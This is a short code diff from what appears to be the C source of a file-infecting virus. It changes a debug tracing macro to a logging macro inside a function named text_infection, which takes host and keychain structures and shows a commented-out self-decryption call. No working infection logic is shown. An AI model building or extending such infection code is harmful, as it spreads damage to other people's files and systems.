@@ -35,8 +35,8 @@ void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 {
 //	decrypt_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
 
-#if DEBUG
-	MID_TRACER("text_infection:\t\t");
+#if LOGGER
+	MID_LOGGER("text_infection:\t\t");
 #endif
 
 	if (context == FAILURE)
